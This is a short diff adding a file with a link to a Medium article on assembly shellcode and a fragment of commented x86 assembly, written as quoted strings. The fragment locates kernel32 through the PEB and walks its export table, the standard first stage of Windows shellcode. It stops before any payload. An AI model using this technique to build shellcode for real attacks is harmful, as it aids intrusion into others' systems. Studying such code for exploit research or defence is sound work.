@@ -1,0 +1,18 @@
+https://medium.com/@vinicius.batistella.99/explaining-assembly-shellcode-19e00c30d80d
+
+"find_kernel32:                     ;"  #
+"   xor ecx, ecx                    ;"  # ECX = 0
+"   mov eax, fs:[ecx + 0x30]        ;"  # EAX = PEB
+"   mov eax, [eax + 0xc]            ;"  # EAX = PEB -> Ldr
+"   mov esi, [eax + 0x14]           ;"  # ESI = PEB -> Ldr.InMemOrder
+"   lodsd                           ;"  # EAX = Second module
+"   xchg eax, esi                   ;"  # EAX <=> ESI
+"   lodsd                           ;"  # EAX = Third(kernel32)
+"   mov ebx, [eax + 0x10]           ;"  # EBX = Kernel32 base address
+"   mov edx, [ebx + 0x3c]           ;"  # EDX = DOS -> e_lfanew
+"   add edx, ebx                    ;"  # EDX = PE Header
+"   mov edx, [edx + 0x78]           ;"  # EDX = Offset export table
+"   add edx, ebx                    ;"  # EDX = Export table
+"   mov esi, [edx + 0x20]           ;"  # ESI = Offset name table
+"   add esi, ebx                    ;"  # ESI = Names tables
+"   xor ecx, ecx                    ;"  # ECX = 0
